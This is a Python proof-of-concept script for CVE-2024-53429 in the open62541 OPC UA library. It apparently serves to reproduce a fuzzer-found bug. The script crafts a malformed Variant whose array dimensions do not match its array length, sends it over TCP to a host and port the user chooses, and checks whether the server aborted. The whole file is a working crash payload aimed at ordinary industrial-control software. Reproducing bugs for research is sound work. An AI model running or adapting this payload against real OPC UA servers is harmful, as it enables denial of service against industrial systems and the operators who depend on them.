#!/usr/bin/env python3
"""
PoC for CVE-2024-53429 - open62541 Variant binary-decode inconsistency.

Crafts an OPC UA binary-encoded UA_Variant of an Int32 array WITH array
dimensions, where product(arrayDimensions) != arrayLength. The unpatched
v1.4.6 DECODE_BINARY(Variant) accepts it; the encoder later rejects it with
BADENCODINGERROR -> the fuzz_binary_decode.cc:79 reachable assertion -> SIGABRT.

Wire layout of the Variant (built per the OPC UA binary spec):
  encodingByte = 0xC6   (0x80 ARRAY | 0x40 DIMENSIONS | 0x06 -> typeKind Int32=5)
  arrayLength  = int32  2          -> decoder allocates a 2-element Int32 array
  array data   = 2 x int32         -> {0x11111111, 0x22222222}
  dimsLength   = int32  2          -> arrayDimensions = [3, 3]
  dims data    = 2 x int32         -> product = 9  !=  arrayLength 2  (mismatch)

Sent as a 4-byte little-endian length prefix + the Variant bytes (the harness
frame format).
"""
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4840


def build_variant() -> bytes:
    enc = b"\xC6"                                   # Int32 array + dimensions
    enc += struct.pack("<i", 2)                     # arrayLength = 2
    enc += struct.pack("<ii", 0x11111111, 0x22222222)  # 2 Int32 values
    enc += struct.pack("<i", 2)                     # arrayDimensions length = 2
    enc += struct.pack("<ii", 3, 3)                 # dims [3,3] -> product 9 != 2
    return enc


def main():
    variant = build_variant()
    print(f"[*] CVE-2024-53429 PoC -> {HOST}:{PORT}")
    print(f"[*] malformed Variant ({len(variant)} bytes): {variant.hex()}")
    print("[*] arrayLength=2 but arrayDimensions product=3*3=9 (mismatch)")

    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(struct.pack("<I", len(variant)) + variant)

    s.settimeout(5)
    try:
        data = s.recv(256)
        print(f"[*] server replied {len(data)} bytes (no crash on this input)")
    except (socket.timeout, ConnectionResetError) as e:
        print(f"[+] Connection dropped/timeout ({e})")
        print("[+] Server likely aborted (SIGABRT on the assertion) -> check docker logs")
    s.close()


if __name__ == "__main__":
    main()
